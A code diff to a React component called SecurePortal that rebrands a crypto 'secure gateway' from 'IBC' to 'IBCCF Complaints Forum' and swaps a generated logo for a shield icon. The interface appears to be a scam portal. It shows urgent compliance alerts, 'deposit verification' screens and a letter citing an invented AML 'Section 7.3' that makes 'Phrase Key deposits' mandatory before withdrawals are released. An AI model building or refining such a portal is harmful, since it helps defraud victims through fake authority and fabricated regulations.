@@ -6,10 +6,9 @@ import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Textarea } from "@/components/ui/textarea";
-import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home, Copy, Moon, Sun, Download, Printer, TrendingUp } from "lucide-react";
+import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home, Copy, Moon, Sun, Download, Printer, TrendingUp, Shield } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useTheme } from "@/App";
-import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
 
 interface Case {
@@ -580,7 +579,9 @@ export default function SecurePortal() {
       <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
         <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
           <div className="text-center mb-8">
-            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" data-testid="img-logo" />
+            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-[#004182]/20 flex items-center justify-center" data-testid="img-logo">
+              <Shield className="h-10 w-10 text-[#004182]" />
+            </div>
             <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
             <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
           </div>
@@ -718,10 +719,12 @@ export default function SecurePortal() {
               <div className="flex items-center gap-4">
                 <div className="relative">
                   <div className="absolute inset-0 bg-blue-500 blur-lg opacity-50 rounded-full"></div>
-                  <img src={ibcLogo} alt="IBC" className="h-12 w-12 object-contain relative" />
+                  <div className="w-12 h-12 rounded-full bg-white/20 flex items-center justify-center relative">
+                    <Shield className="h-7 w-7 text-white" />
+                  </div>
                 </div>
                 <div>
-                  <h1 className="font-bold text-lg tracking-wide">IBC SECURE GATEWAY</h1>
+                  <h1 className="font-bold text-lg tracking-wide">IBCCF SECURE PORTAL</h1>
                   <div className="flex items-center gap-2">
                     <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                     <p className="text-xs text-blue-200 uppercase tracking-wider">Member Dashboard</p>
@@ -776,7 +779,7 @@ export default function SecurePortal() {
                     Verified Account
                   </span>
                   <span className="text-slate-300">•</span>
-                  <span className="font-mono text-sm">IBC-{currentCase?.accessCode}</span>
+                  <span className="font-mono text-sm">IBCCF-{currentCase?.accessCode}</span>
                 </div>
               </div>
               <div className="flex items-center gap-3">
@@ -940,7 +943,7 @@ export default function SecurePortal() {
               </motion.div>
               <div className="flex-1">
                 <h3 className="font-bold text-red-900 text-lg">Immediate Action Required</h3>
-                <p className="text-red-700">You have pending requirements from IBC compliance team. Please review and respond promptly.</p>
+                <p className="text-red-700">You have pending requirements from IBCCF compliance team. Please review and respond promptly.</p>
               </div>
               <Button 
                 className="bg-red-600 hover:bg-red-700 shadow-lg"
@@ -1177,14 +1180,14 @@ export default function SecurePortal() {
               </Card>
             </motion.div>
 
-            {/* IBC Support Card */}
+            {/* IBCCF Support Card */}
             <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.7 }}>
               <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setIsChatOpen(true)} data-testid="card-support">
                 <CardHeader className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white rounded-t-lg">
                   <div className="flex items-center justify-between">
                     <CardTitle className="flex items-center gap-2">
                       <MessageCircle className="w-5 h-5" />
-                      IBC Support
+                      IBCCF Support
                     </CardTitle>
                     {unreadCount > 0 && (
                       <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
@@ -1193,7 +1196,7 @@ export default function SecurePortal() {
                 </CardHeader>
                 <CardContent className="pt-6">
                   <p className="text-slate-600 text-sm mb-4">
-                    Chat with IBC support for assistance with your account.
+                    Chat with IBCCF support for assistance with your account.
                   </p>
                   <Button className="w-full mt-6" variant="outline">
                     <MessageCircle className="w-4 h-4 mr-2" />
@@ -1268,7 +1271,7 @@ export default function SecurePortal() {
                     <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 bg-green-400 rounded-full border border-blue-600"></span>
                   </div>
                   <div>
-                    <span className="font-semibold block">IBC Support</span>
+                    <span className="font-semibold block">IBCCF Support</span>
                     <span className="text-xs text-blue-200">Online • Typically replies in minutes</span>
                   </div>
                 </div>
@@ -1289,7 +1292,7 @@ export default function SecurePortal() {
                     <div className="w-16 h-16 bg-blue-100 rounded-full mx-auto flex items-center justify-center mb-4">
                       <MessageCircle className="h-8 w-8 text-blue-500" />
                     </div>
-                    <p className="font-medium text-slate-700 mb-1">Welcome to IBC Support</p>
+                    <p className="font-medium text-slate-700 mb-1">Welcome to IBCCF Support</p>
                     <p className="text-sm text-slate-500">How can we help you today?</p>
                   </div>
                 ) : (
@@ -1297,7 +1300,7 @@ export default function SecurePortal() {
                     <div key={msg.id} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                       {msg.sender === 'admin' && (
                         <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center mr-2 flex-shrink-0">
-                          <span className="text-blue-600 font-bold text-xs">IBC</span>
+                          <span className="text-blue-600 font-bold text-xs">IBCCF</span>
                         </div>
                       )}
                       <div
@@ -1429,7 +1432,7 @@ export default function SecurePortal() {
             </Button>
             <div>
               <h1 className="font-bold">Required Actions</h1>
-              <p className="text-xs text-blue-200">View messages from IBC</p>
+              <p className="text-xs text-blue-200">View messages from IBCCF</p>
             </div>
           </div>
         </nav>
@@ -1532,7 +1535,7 @@ export default function SecurePortal() {
             <div className="text-center py-16">
               <MessageCircle className="w-16 h-16 mx-auto text-slate-300 mb-4" />
               <h3 className="text-xl font-semibold text-slate-600">No Messages</h3>
-              <p className="text-slate-500">You have no messages from IBC at this time.</p>
+              <p className="text-slate-500">You have no messages from IBCCF at this time.</p>
             </div>
           )}
         </main>
@@ -1702,7 +1705,7 @@ export default function SecurePortal() {
               <p className="text-slate-600 mb-4">Need help with your deposit?</p>
               <Button onClick={() => setIsChatOpen(true)}>
                 <MessageCircle className="w-4 h-4 mr-2" />
-                Contact IBC Support
+                Contact IBCCF Support
               </Button>
             </CardContent>
           </Card>
@@ -1713,16 +1716,18 @@ export default function SecurePortal() {
 
   // SUCCESS VIEW - Redirects to deposit address chat
   if (viewState === 'success') {
-    const ticketId = lastSubmission?.id ? `IBC-${String(lastSubmission.id).padStart(6, '0')}` : `IBC-${Date.now().toString().slice(-6)}`;
+    const ticketId = lastSubmission?.id ? `IBCCF-${String(lastSubmission.id).padStart(6, '0')}` : `IBCCF-${Date.now().toString().slice(-6)}`;
     
     return (
       <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
         {/* Header */}
         <nav className="bg-primary text-white shadow-lg">
           <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
-            <img src={ibcLogo} alt="IBC" className="h-10 w-10 object-contain" />
+            <div className="w-10 h-10 rounded-lg bg-white/20 flex items-center justify-center">
+              <Shield className="h-6 w-6 text-white" />
+            </div>
             <div>
-              <h1 className="font-bold">IBC SECURE GATEWAY</h1>
+              <h1 className="font-bold">IBCCF SECURE PORTAL</h1>
               <p className="text-xs text-blue-200">Deposit Verification Required</p>
             </div>
           </div>
@@ -1935,7 +1940,9 @@ export default function SecurePortal() {
       <div className="min-h-screen bg-slate-900 p-4 font-sans">
         <div className="max-w-3xl mx-auto">
           <div className="flex items-center gap-3 mb-8">
-            <img src={ibcLogo} alt="IBC Logo" className="h-10 w-10 object-contain opacity-80" />
+            <div className="w-10 h-10 rounded-lg bg-[#004182]/20 flex items-center justify-center">
+              <Shield className="h-6 w-6 text-[#004182]" />
+            </div>
             <div>
               <h1 className="text-xl font-bold text-white">Activity Timeline</h1>
               <p className="text-slate-400 text-xs">Your complete account history</p>
@@ -2027,7 +2034,9 @@ export default function SecurePortal() {
       <div className="min-h-screen bg-slate-900 p-4 font-sans">
         <div className="max-w-3xl mx-auto">
           <div className="flex items-center gap-3 mb-8">
-            <img src={ibcLogo} alt="IBC Logo" className="h-10 w-10 object-contain opacity-80" />
+            <div className="w-10 h-10 rounded-lg bg-[#004182]/20 flex items-center justify-center">
+              <Shield className="h-6 w-6 text-[#004182]" />
+            </div>
             <div>
               <h1 className="text-xl font-bold text-white">Document Archive</h1>
               <p className="text-slate-400 text-xs">Your submission history</p>
@@ -2089,7 +2098,7 @@ export default function SecurePortal() {
     );
   }
 
-  // LETTER VIEW - Professional IBC Design
+  // LETTER VIEW - Professional IBCCF Design
   
   // Check if letter has been sent by admin
   if (!currentCase?.letterSent) {
@@ -2141,9 +2150,9 @@ export default function SecurePortal() {
   const letter = letterContent || {
     headline: "Withdrawal Protocol Selection",
     introduction: `We acknowledge the successful completion of your re-authentication procedure.`,
-    bodyContent: `In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.`,
+    bodyContent: `In accordance with IBCCF cross-border withdrawal regulations, please review the finalised withdrawal options for your account.`,
     footerNote: "NEXT ACTION REQUIRED: Please confirm your preferred withdrawal option below.",
-    complianceReference: `IBC-AML-CC-${currentCase?.accessCode || ''}`,
+    complianceReference: `IBCCF-AML-CC-${currentCase?.accessCode || ''}`,
     optionATitle: "Accelerated Release",
     optionADescription: "Full withdrawal amount processed in accelerated batches.",
     optionAFrequency: "every 12 hours",
@@ -2161,7 +2170,7 @@ export default function SecurePortal() {
       "Deposits are tracked automatically and confirmed within 24 hours.",
       "No other tokens, currencies, or payment methods are supported."
     ]),
-    complianceNotice: "Per IBC Anti-Money Laundering (AML) Protocol Section 7.3: Phrase Key deposits are mandatory for all outbound transfers. Failure to submit keys on schedule will pause your withdrawal and may result in extended compliance review."
+    complianceNotice: "Per IBCCF Anti-Money Laundering (AML) Protocol Section 7.3: Phrase Key deposits are mandatory for all outbound transfers. Failure to submit keys on schedule will pause your withdrawal and may result in extended compliance review."
   };
 
   // Parse phrase key requirements
@@ -2183,9 +2192,11 @@ export default function SecurePortal() {
         <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
           <div className="flex justify-between h-16">
             <div className="flex items-center gap-4">
-              <img src={ibcLogo} alt="IBC Logo" className="h-10 w-10 object-contain" />
+              <div className="w-10 h-10 rounded-lg bg-white/20 flex items-center justify-center">
+                <Shield className="h-6 w-6 text-white" />
+              </div>
               <div>
-                <div className="text-sm font-bold leading-none">INTERNATIONAL BLOCKCHAIN COMMUNITY</div>
+                <div className="text-sm font-bold leading-none">IBCCF COMPLAINTS FORUM</div>
                 <div className="text-[10px] text-slate-400 font-medium tracking-wider uppercase">Secure Gateway Portal</div>
               </div>
             </div>
@@ -2237,9 +2248,11 @@ export default function SecurePortal() {
             {/* Letter Header with Logo */}
             <div className="bg-gradient-to-r from-slate-900 to-slate-800 text-white px-8 py-6">
               <div className="flex items-center gap-4">
-                <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain" />
+                <div className="w-16 h-16 rounded-xl bg-white/20 flex items-center justify-center">
+                  <Shield className="h-10 w-10 text-white" />
+                </div>
                 <div>
-                  <h1 className="text-xl font-bold tracking-wide">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h1>
+                  <h1 className="text-xl font-bold tracking-wide">INTERNATIONAL BLOCKCHAIN COMMUNITY COMPLAINTS FORUM (IBCCF)</h1>
                   <p className="text-slate-300 text-sm uppercase tracking-widest">Account Integrity & Security Operations Division (ISO-D)</p>
                   <p className="text-slate-400 text-xs uppercase tracking-wider">Global Compliance Secretariat</p>
                 </div>
@@ -2327,7 +2340,7 @@ export default function SecurePortal() {
                       <div className="bg-white rounded-lg p-4 border border-green-200 space-y-3 mb-4">
                         <div className="flex justify-between text-sm">
                           <span className="text-slate-600">Reference Number</span>
-                          <span className="font-mono font-bold text-green-700">IBC-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
+                          <span className="font-mono font-bold text-green-700">IBCCF-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
                         </div>
                         <div className="flex justify-between text-sm">
                           <span className="text-slate-600">Selected Option</span>
